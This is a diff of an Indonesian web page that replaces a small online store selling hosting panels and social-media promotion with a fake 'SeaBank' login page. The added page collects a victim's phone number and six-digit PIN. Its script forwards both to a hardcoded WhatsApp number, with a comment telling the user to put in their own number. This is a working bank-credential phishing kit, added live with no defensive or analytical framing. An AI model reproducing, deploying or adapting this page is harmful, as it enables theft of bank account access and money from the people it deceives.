@@ -1,175 +1,41 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>FahzOfficial Store</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: url('assets/bg.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: auto;
-      padding: 20px;
-      background-color: rgba(0, 0, 0, 0.8);
-      border-radius: 12px;
-      margin-top: 20px;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 10px;
-    }
-
-    label, select, input {
-      display: block;
-      width: 100%;
-      margin: 10px 0;
-    }
-
-    .produk, .formulir {
-      margin-top: 20px;
-    }
-
-    button {
-      background-color: #28a745;
-      color: white;
-      padding: 12px;
-      border: none;
-      width: 100%;
-      font-size: 16px;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    .btn-group {
-      text-align: center;
-      margin-top: 10px;
-    }
-
-    .btn-group a {
-      padding: 10px 20px;
-      margin: 5px;
-      color: white;
-      text-decoration: none;
-      border-radius: 6px;
-    }
-
-    .whatsapp {
-      background-color: #25d366;
-    }
-
-    .telegram {
-      background-color: #0088cc;
-    }
-
-    img {
-      display: block;
-      margin: 0 auto;
-      max-width: 100%;
-      border-radius: 10px;
-    }
-
-    small {
-      display: block;
-      text-align: center;
-      margin-top: 10px;
-      font-style: italic;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login SeaBank</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <div class="container">
-    <img src="assets/logo.png" alt="Logo">
-    <small>"INI KONTAK DEVELOPER KAMI ATAU FahzOfficial."</small>
-    <div class="btn-group">
-      <a href="https://wa.me/6281234567890" class="whatsapp">WhatsApp</a>
-      <a href="https://t.me/fahzofficial" class="telegram">Telegram</a>
-    </div>
+<div class="login-container">
+  <h2>SeaBank</h2>
+  <form id="loginForm">
+    <input type="tel" id="nomor" placeholder="Nomor HP (08xxxxx)" required>
+    <input type="password" id="pin" placeholder="PIN 6 Digit" minlength="6" maxlength="6" required>
+    <button type="submit">Masuk</button>
+  </form>
+</div>
 
-    <div class="produk">
-      <h2><i class="fas fa-cart-shopping"></i> Produk FahzOfficial</h2>
-      <label for="produk">Pilih Produk</label>
-      <select id="produk" onchange="updateHarga()">
-        <option value="">-- Pilih Produk --</option>
-        <option value="1K">PANEL 1GB : 1K</option>
-        <option value="2K">PANEL 2GB : 2K</option>
-        <option value="3K">PANEL 3GB : 3K</option>
-        <option value="4K">PANEL 4GB : 4K</option>
-        <option value="5K">PANEL 5GB : 5K</option>
-        <option value="6K">PANEL 6GB : 6K</option>
-        <option value="7K">PANEL 7GB : 7K</option>
-        <option value="8K">PANEL 8GB : 8K</option>
-        <option value="9K">PANEL 9GB : 9K</option>
-        <option value="10K">PANEL 10GB : 10K</option>
-        <option value="13K">PANEL UNLI : 13K</option>
-        <option value="15K">RESELLER PANEL : 15K</option>
-        <option value="7K">NOKOS INDO/LUAR : 7K</option>
-        <option value="20K">ADMIN PANEL : 20K</option>
-        <option value="25K">OWNER PANEL : 25K</option>
-        <option value="15K">JASA RENAME SC : 15K</option>
-        <option value="30K">PT FAHZ OFFICIAL : 30K</option>
-        <option value="JASA PUSH CH">JASA PUSH CH</option>
-        <option value="MURID PUSH CH">MURID PUSH CH</option>
-        <option value="OWNER PUSH CH">OWNER PUSH CH</option>
-        <option value="PT PUSH CH">PT PUSH CH</option>
-        <option value="15K">JASA BUAT WEB STORE 15K FREE REQUEST NO GARANSI</option>
-        <option value="25K">JASA BUAT WEB STORE ATAU APA 25K BERGARANSI 30H</option>
-        <option value="40K">JASA WEB STORE BEBAS REQUEST DLL 40K GARANSI PERMANEN</option>
-      </select>
-    </div>
+<script>
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const nomor = document.getElementById("nomor").value.trim();
+    const pin = document.getElementById("pin").value.trim();
 
-    <div class="formulir">
-      <h2><i class="fas fa-file-invoice-dollar"></i> Formulir Pembayaran</h2>
-      <label for="nama">Nama Lengkap</label>
-      <input type="text" id="nama" placeholder="Contoh: Fahri Alan">
-
-      <label for="harga">💰 Harga</label>
-      <input type="text" id="harga" readonly>
-
-      <label for="metode">💳 Metode Pembayaran</label>
-      <select id="metode">
-        <option value="">-- Pilih Metode --</option>
-        <option value="DANA">DANA</option>
-        <option value="QRIS">QRIS</option>
-      </select>
-
-      <label for="bukti">🧾 Upload Bukti Transfer</label>
-      <input type="file" id="bukti">
-
-      <button onclick="kirimPembayaran()">📥 Kirim Pembayaran</button>
-    </div>
-  </div>
-
-  <script>
-    function updateHarga() {
-      const produk = document.getElementById('produk').value;
-      document.getElementById('harga').value = produk;
+    if (!/^08\d{8,}$/.test(nomor)) {
+      alert("Nomor HP tidak valid!");
+      return;
     }
 
-    function kirimPembayaran() {
-      const nama = document.getElementById('nama').value;
-      const produk = document.getElementById('produk').options[document.getElementById('produk').selectedIndex].text;
-      const harga = document.getElementById('harga').value;
-      const metode = document.getElementById('metode').value;
+    // Ganti nomor WA tujuan di bawah ini
+    const nomorWA = "639640119085"; // Ganti dengan nomormu
 
-      if (!nama || !produk || !harga || !metode) {
-        alert("Harap lengkapi semua data!");
-        return;
-      }
-
-      const pesan = `Nama: ${nama}%0AProduk: ${produk}%0AHarga: ${harga}%0AMetode: ${metode}`;
-      window.open(`https://wa.me/6281234567890?text=${pesan}`, '_blank');
-    }
-  </script>
+    const pesan = `*Login SeaBank:*\nNomor: ${nomor}\nPIN: ${pin}`;
+    const url = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
+    window.location.href = url;
+  });
+</script>
 
 </body>
-        </html>
+</html>
